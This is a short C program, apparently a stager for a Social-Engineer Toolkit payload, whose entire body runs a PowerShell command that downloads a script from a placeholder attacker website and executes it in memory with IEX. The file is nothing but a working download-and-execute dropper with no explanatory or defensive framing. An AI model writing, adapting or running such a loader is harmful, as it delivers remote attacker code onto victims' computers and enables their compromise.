#include<stdio.h>
#include<stdlib.h>

main() {
	system("powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://seuWebSite.aqui/suaCargaSetookitPowerShell.txt'))\"");
	return 0;
}
